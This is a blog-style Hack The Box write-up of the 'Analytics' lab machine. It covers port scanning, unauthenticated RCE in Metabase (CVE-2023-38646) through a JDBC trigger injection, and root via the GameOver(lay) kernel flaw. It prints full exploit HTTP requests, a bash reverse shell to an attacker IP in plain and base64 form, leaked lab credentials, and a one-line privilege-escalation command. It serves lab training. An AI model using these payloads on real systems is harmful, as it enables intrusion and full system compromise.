---
categories:
- write-up
- Linux
- Easy
date: "2024-12-12T00:00:00Z"
title: Analytics - Hack The Box
toc: true
displayUpdatedDate: true
enableInlineShortcodes: true
layout: list
---
![](/assets/images/HTB/Analytics/Analitics-LOGO.png)


This machine focuses on exploiting a vulnerable instance of *Metabase* to gain initial access. with the help of the exploit - CVE-2023-38646, we obtain command execution on the target. The next phase involves navigating a Docker container environment, leveraging exposed credentials, and transitioning to an SSH session with user-level access. Finally, the privilege escalation is achieved by exploiting a known vulnerability (CVE-2023-2640) in the operating system to gain root access.

{{< callout type="info" >}}
  Tags:

{{% details title="show tags"  closed="true" %}}

- Metabase
- CVE-2023-38646
- API
- UnAuthenticated RCE
- Base64
- GameOver-lay
- Kernel exploits
- CVE-2023-2640

{{% /details %}}
{{< /callout >}}

## Enumeration. 
- ***IP:*** 10.10.11.233
- ***Enviroment:*** Linux
### Port Scan.

We sstart by using *Nmap*, performing a scan of all ports to discover *services running* on the target machine.

```bash
sudo nmap -sS -sV -sC -p- -vvv -oA nmap/allPorts 10.10.11.233
```

```python
# Nmap 7.94SVN scan initiated Tue Mar 12 21:07:41 2024 as: nmap -sS -sV -sC -p- -vvv -oA nmap/allPorts 10.10.11.233
Nmap scan report for 10.10.11.233
Host is up, received echo-reply ttl 63 (0.073s latency).
Scanned at 2024-03-12 21:07:42 EDT for 68s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://analytical.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan reveal *2 open ports* (22 & 80) and we can see its redirecting to the domain *analytical.htb*. Adding analytical.htb to /etc/hosts allowed us to access the web service; after investigating the web page we can find a subdomain, data.analytical.htb, hosting a **Metabase** login page.

![Alt Text](/assets/images/HTB/Analytics/Analitics1.png)

## FootHold.

### Finding the exploit.
I looked only for "metabase Vulnerabilities" and I am able to find an unauthenticated RCE vulnerability (**CVE-2023-38646**). CVE-2023-38646 is a critical vulnerability in Metabase, an open-source business intelligence tool, allowing pre-authentication remote code execution (RCE). This means an attacker can execute arbitrary commands on a Metabase server **without needing valid login credentials**. Exploiting this required extracting the setup token from the API endpoint */api/session/properties* (for more information on this exploit, check this [blog](https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646)).

### Exploit setup.

If we go to http://data.analytical.htb/api/session/properties we will be able to see some "restictied/privileged" information the API is providing us due to **insufficient validation and accass control** on metabase.

![Alt Text](/assets/images/HTB/Analytics/Analitics2.png)

- **setup-token** :249fa03d-fd94-4d5b-b94f-b4ebf3df681f

By creating a payload encoded in Base64, we could inject a reverse shell via Metabase's database setup. Here is an example of the *post* request that needs to be made to trigger the vulnerability:

```json
POST /api/setup/validate HTTP/1.1
Host: localhost
Content-Type: application/json
Content-Length: 812

{
    "token": "5491c003-41c2-482d-bab4-6e174aa1738c",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvOTk5OCAwPiYx}|{base64,-d}|{bash,-i}')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}
```


- Here's the reverse shell payload:
```bash
bash -i >& /dev/tcp/10.10.14.13/443 0>&1
```
- Encoded version:
```
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDMgIDA+JjEK
```
### Exploit execution.
Using Burp Suite's Repeater, we sent a POST request to */api/setup/validate* with the  payload embedded in the request body.

```json
POST /api/setup/validate HTTP/1.1
Host: data.analytical.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Content-Type: application/json
Content-Length: 822


{
    "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDMgIDA+JjEK}|{base64,-d}|{bash,-i}')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}
```

![Alt Text](/assets/images/HTB/Analytics/Analitics3.png)


Before sending the Burp request (payload), we set up a listener on port 443 to capture the reverse shell.

![Alt Text](/assets/images/HTB/Analytics/Analitics5.png)

## Privilege escalation - Root.

Something that i usually do when i get to a new system is to check the *enviroment variables* some times we can find useful information in there.

```bash
env
```

![Alt Text](/assets/images/HTB/Analytics/Analitics6.png)

Inspecting the environment variables revealed application(metabase) credentials:
•	User: metalytics
•	Password: An4lytics_ds20223#

Using these credentials, we accessed the system via SSH to gain a more stable foothold:
bash
```bash
ssh metalytics@10.10.11.233
```

### Kernel Exploit for Privilege Escalation
#### Finding kernel version
The target machine was running **Ubuntu 22.04.2**. A quick search revealed a privilege escalation vulnerability (CVE-2023-2640) in the kernel. This can be found either by using similar tools to linpeas.sh or using linux commands:

```bash
uname -a
```
![Alt Text](/assets/images/HTB/Analytics/Analitics7.png)

After trying out multiple exploits I was able to find a [working exploit.](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)

#### Running exploit
The exploit involved leveraging unshare to execute a privileged shell. 
```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

![Alt Text](/assets/images/HTB/Analytics/Analytics8.png)

After running the executable created, we gained root access to the system:
```bash
whoami
```
![Alt Text](/assets/images/HTB/Analytics/Analytics9.png)

## Takeaways:
-	Always start with thorough enumeration, as it uncovers critical entry points like subdomains or API endpoints.
-	CVE research and public write-ups are invaluable for learning manual exploitation techniques.
-	Kernel privilege escalation remains a go-to technique when user-level access is obtained.
- By following this step-by-step guide, we successfully exploited and rooted the machine. It’s a great example of chaining vulnerabilities for a complete compromise!

